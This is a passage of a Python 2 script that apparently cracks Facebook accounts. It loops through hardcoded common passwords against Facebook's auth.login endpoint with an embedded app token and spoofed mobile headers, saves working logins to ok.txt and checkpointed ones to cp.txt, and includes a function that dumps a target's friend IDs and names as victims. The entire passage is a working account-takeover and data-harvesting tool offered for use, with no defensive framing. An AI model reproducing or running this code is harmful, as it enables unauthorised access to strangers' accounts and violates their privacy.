                    headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                    data = requests.get(api, params=params, headers=headers_)

                    if 'access_token' in data.text and 'EAAA' in data.text:

                        print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'

                        ok = open('ok.txt', 'a')

                        ok.write(uid + '|' + pass3 + '\n')

                        ok.close()

                        oks.append(uid + pass3)

                    elif 'www.facebook.com' in data.json()['error_msg']:

                        print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'

                        cp = open('cp.txt', 'a')

                        cp.write(uid + '|' + pass3 + '\n')

                        cp.close()

                        cps.append(uid + pass3)

                    else:

                        pass4 = '786786786'

                        api = 'https://b-api.facebook.com/method/auth.login'

                        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass4, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                        headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                        data = requests.get(api, params=params, headers=headers_)

                        if 'access_token' in data.text and 'EAAA' in data.text:

                            print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'

                            ok = open('ok.txt', 'a')

                            ok.write(uid + '|' + pass4 + '\n')

                            ok.close()

                            oks.append(uid + pass4)

                        elif 'www.facebook.com' in data.json()['error_msg']:

                            print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'

                            cp = open('cp.txt', 'a')

                            cp.write(uid + '|' + pass4 + '\n')

                            cp.close()

                            cps.append(uid + pass4)

                        else:

                            pass5 = '889900'

                            api = 'https://b-api.facebook.com/method/auth.login'

                            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass5, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                            data = requests.get(api, params=params, headers=headers_)

                            if 'access_token' in data.text and 'EAAA' in data.text:

                                print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'

                                ok = open('ok.txt', 'a')

                                ok.write(uid + '|' + pass5 + '\n')

                                ok.close()

                                oks.append(uid + pass5)

                            elif 'www.facebook.com' in data.json()['error_msg']:

                                print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'

                                cp = open('cp.txt', 'a')

                                cp.write(uid + '|' + pass5 + '\n')

                                cp.close()

                                cps.append(uid + pass5)

                            else:

                                pass6 = '102030'

                                api = 'https://b-api.facebook.com/method/auth.login'

                                params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass6, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                                headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                                data = requests.get(api, params=params, headers=headers_)

                                if 'access_token' in data.text and 'EAAA' in data.text:

                                    print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'

                                    ok = open('ok.txt', 'a')

                                    ok.write(uid + '|' + pass6 + '\n')

                                    ok.close()

                                    oks.append(uid + pass6)

                                elif 'www.facebook.com' in data.json()['error_msg']:

                                    print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'

                                    cp = open('cp.txt', 'a')

                                    cp.write(uid + '|' + pass6 + '\n')

                                    cp.close()

                                    cps.append(uid + pass6)

                                else:

                                    pass7 = '786110'

                                    api = 'https://b-api.facebook.com/method/auth.login'

                                    params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass7, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                                    headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                                    data = requests.get(api, params=params, headers=headers_)

                                    if 'access_token' in data.text and 'EAAA' in data.text:

                                        print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'

                                        ok = open('ok.txt', 'a')

                                        ok.write(uid + '|' + pass7 + '\n')

                                        ok.close()

                                        oks.append(uid + pass7)

                                    elif 'www.facebook.com' in data.json()['error_msg']:

                                        print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'

                                        cp = open('cp.txt', 'a')

                                        cp.write(uid + '|' + pass7 + '\n')

                                        cp.close()

                                        cps.append(uid + pass7)

        except:

            pass

    p = ThreadPool()

    p.map(main, id)

    print ''

    linex()

    print ''

    print '\x1b[95;1m  Total Ids : \x1b[92;1m' + str(len(id))

    print '\x1b[97;1m  The Process is Running\x1b[0m'

    print 47 * '-'

    print ''

    raw_input('\x1b[93;1m Press Enter To Back ')

    menu()

def ex_id():

    global token

    idg = []

    os.system('clear')

    try:

        token = open('token.txt', 'r').read()

    except (KeyError, IOError):

        token()

    try:

        r = requests.get('https://graph.facebook.com/me?access_token=' + token)

        q = json.loads(r.text)

        name = q['name']

    except KeyError:

        logo()

        print ''

        print '\t\x1b[91;1m  Logged In Token Has Expired'

        os.system('rm -rf token.txt')

        print ''

        time.sleep(1)

        token()

    os.system('clear')

    logo()

    print ''

    print '\x1b[92;1m      Dump Public Id Friend '

    print ''

    idh = raw_input('\x1b[93;1m   Input Id: ')

    try:

        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)

        q = json.loads(r.text)

        print ' Collectin From: ' + q['name']

    except KeyError:

        print ''

        print '\x1b[93;1m\t Invalid Id '

        print ''

        raw_input('\x1b[93;1m Press Enter To Back')

        ex_id()

    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)

    q = json.loads(r.text)

    ids = open('ids.txt', 'w')

    for i in q['data']:

        uid = i['id'].encode('utf-8')

        na = i['name'].encode('utf-8')

        idg.append(uid + '|' + na)

        ids.write(uid + '|' + na + '\n')

    ids.close()

    print ''

    print ''

    print '\x1b[92;1m The Process Has Completed'

    print '\x1b[93;1m Total Ids: \x1b[92;1m' + str(len(idg))

    print ''

    raw_input('\x1b[95;1m Press Enter To Download File')

    print '\x1b[93;1m File Downloaded Successfully'

    print '\x1b[92;1m Saved /sdcard/ids.txt'

    print ''

    time.sleep(1)

    ex_id()

if __name__ == '__main__':

    main()

